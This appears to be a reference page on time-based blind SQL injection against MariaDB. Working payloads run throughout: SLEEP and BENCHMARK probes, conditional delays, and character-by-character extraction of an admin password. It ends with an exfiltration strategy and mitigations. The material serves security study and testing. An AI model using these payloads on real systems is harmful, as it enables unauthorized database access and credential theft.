---
title: Timing
description: Using time-based techniques in MariaDB injections
category: Injection Techniques
order: 13
tags: ["time-based", "blind injection", "sleep"]
lastUpdated: 2025-12-18
---

## Timing

Time-based SQL injection is particularly useful in blind scenarios where no visible output is returned from the database. By causing deliberate delays in the database response, an attacker can infer whether a condition is true or false based on the time it takes for the page to load.

## SLEEP() Function

| Function         | Description                                          | Return Value |
| ---------------- | ---------------------------------------------------- | ------------ |
| `SLEEP(seconds)` | Pauses execution for the specified number of seconds | 0 on success |

### Basic Usage

```sql
-- Sleep for 5 seconds
SELECT SLEEP(5)

-- Sleep with decimal precision
SELECT SLEEP(0.5)

-- SLEEP(0) returns immediately
SELECT SLEEP(0)

-- SLEEP returns 0 on success
SELECT SLEEP(1) AS result
-- Returns: 0
```

### SLEEP in Expressions

```sql
-- SLEEP can be used in expressions
SELECT 1 + SLEEP(3)

-- Multiple SLEEP calls are cumulative
SELECT SLEEP(2), SLEEP(2)
-- Total delay: 4 seconds
```

## Basic Sleep Injection

```sql
-- AND pattern
' AND SLEEP(5)--

-- OR pattern
' OR SLEEP(5)--
```

If the query takes an additional 5 seconds to return, the injection was successful.

### SLEEP in UNION Injection

```sql
SELECT id, username FROM users WHERE id = 999
UNION SELECT SLEEP(5), 'test'
```

### SLEEP in Subquery

```sql
SELECT * FROM users WHERE id = (SELECT SLEEP(5))
```

## Conditional Sleep

More useful for data extraction is conditional sleep, which only triggers the delay if a specific condition is true:

### Using IF()

```sql
-- Basic conditional
' AND IF(condition, SLEEP(5), 0)--

-- True condition causes delay
SELECT IF(1=1, SLEEP(5), 0)

-- False condition returns immediately
SELECT IF(1=2, SLEEP(5), 0)
```

### Using CASE WHEN

```sql
SELECT CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END
```

### Conditional SLEEP in WHERE Clause

```sql
SELECT * FROM users WHERE id = 1 AND IF(username='admin', SLEEP(5), 0) = 0
```

## Extracting Data Character by Character

### Direct Character Comparison

```sql
-- Test if first character is 'a'
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--

-- Wrong character doesn't cause delay
' AND IF(SUBSTRING((SELECT username FROM users WHERE id = 1),1,1)='z', SLEEP(5), 0)--
```

### ASCII Comparison

```sql
-- Extract using ASCII value (97 = 'a')
SELECT IF(
  ASCII(SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1)) = 97,
  SLEEP(5), 0
)
```

### Binary Search Pattern

More efficient than testing each character individually:

```sql
-- Check if character > threshold (binary search upper half)
SELECT IF(
  ASCII(SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1)) > 90,
  SLEEP(5), 0
)
-- 'a' = 97 > 90, so delays

-- Check if character <= threshold (binary search lower half)
SELECT IF(
  ASCII(SUBSTRING((SELECT username FROM users WHERE id = 1), 1, 1)) > 100,
  SLEEP(5), 0
)
-- 'a' = 97 <= 100, so no delay
```

### Length Extraction

```sql
-- Check if length equals specific value
SELECT IF(
  LENGTH((SELECT username FROM users WHERE id = 1)) = 5,
  SLEEP(5), 0
)
-- 'admin' has 5 characters, so delays
```

## BENCHMARK() Function

| Function                 | Description                       | Return Value |
| ------------------------ | --------------------------------- | ------------ |
| `BENCHMARK(count, expr)` | Executes expression `count` times | 0 on success |

### Basic Usage

```sql
-- Execute SHA1 100 million times
' AND BENCHMARK(100000000, SHA1(1))--

-- Low iterations complete quickly
SELECT BENCHMARK(100, SHA1('test'))

-- High iterations cause measurable delay
SELECT BENCHMARK(10000000, SHA1('test'))
```

### Alternative Hash Functions

```sql
-- Using MD5
SELECT BENCHMARK(10000000, MD5('test'))

-- Using AES_ENCRYPT
SELECT BENCHMARK(10000, AES_ENCRYPT('test', 'key'))
```

## Conditional BENCHMARK

```sql
-- True condition executes benchmark
SELECT IF(1=1, BENCHMARK(10000000, SHA1('test')), 0)

-- False condition skips benchmark (fast)
SELECT IF(1=2, BENCHMARK(100000000, SHA1('test')), 0)

-- With data check
SELECT IF(
  (SELECT COUNT(*) FROM users) > 0,
  BENCHMARK(10000000, SHA1('test')), 0
)
```

## Extracting Database Version

```sql
-- Testing if MariaDB version starts with '1' (10.x or 11.x)
' AND IF(SUBSTRING(@@version,1,1)='1', SLEEP(3), 0)--

-- Testing if version is 10.x or 11.x
SELECT IF(SUBSTRING(@@version,1,3) IN ('10.', '11.'), SLEEP(3), 0)

-- Testing specific version
' AND IF(SUBSTRING(@@version,1,4)='10.6', SLEEP(3), 0)--

-- Version detection with BENCHMARK
SELECT IF(
  SUBSTRING(@@version,1,2) IN ('10', '11'),
  BENCHMARK(10000000, SHA1('test')), 0
)
```

## Additional Timing Techniques

### GET_LOCK as Timing Primitive

```sql
-- GET_LOCK can be used for timing (has side effects)
SELECT GET_LOCK('lock_name', 5)
-- Returns 1 if lock acquired, 0 if timeout, NULL on error

-- Re-acquiring the same lock on the same connection returns 1
SELECT GET_LOCK('lock_name', 5)
-- Returns 1 (same connection can re-acquire its own locks)

-- Release the lock
SELECT RELEASE_LOCK('lock_name')
```

### Heavy Computation

```sql
-- Repeated string operations
SELECT IF(1=1, LENGTH(REPEAT(SHA1('x'), 10000)), 0)
```

## Timing in Injection Context

### Boolean Inference

```sql
-- True condition delays
SELECT * FROM users WHERE id = 1
AND IF((SELECT COUNT(*) FROM users WHERE username = 'admin') > 0, SLEEP(5), 0)

-- False condition is fast
SELECT * FROM users WHERE id = 1
AND IF((SELECT COUNT(*) FROM users WHERE username = 'nonexistent') > 0, SLEEP(5), 0)
```

### Stacked Query Timing

```sql
-- Stacked queries (multiple statements separated by semicolon)
SELECT 1; SELECT SLEEP(5)
-- Note: MariaDB doesn't support stacked queries in single query by default
-- Behavior depends on client configuration and connection settings
-- May fail or be rejected in most standard configurations
```

### ORDER BY with Timing

```sql
SELECT * FROM users ORDER BY IF(1=1, SLEEP(5), username)
```

## Data Exfiltration Strategy

A time-based attack to extract data typically involves:

1. **Determine length**: Use timing to find string length
2. **Binary search**: For each position, use > and <= comparisons
3. **Narrow down**: Reduce range until character is identified
4. **Repeat**: Move to next character position

### Efficiency Tips

- Use binary search (halves possibilities each request)
- Start with length detection to know when to stop
- Account for network latency with multiple samples
- Use shorter sleep times when possible

## Mitigations

1. Query execution timeouts
2. Blocking SLEEP() and BENCHMARK() functions
3. Parameterized queries to prevent SQL injection
4. Web Application Firewalls (WAF) that detect timing-based attacks
5. Rate limiting on endpoints

## Notes

- Time-based techniques are generally slower than other injection methods
- Network latency can cause false positives/negatives
- Multiple requests may be needed to confirm results
- Modern servers may implement protection against these attacks
- BENCHMARK timing varies with server load
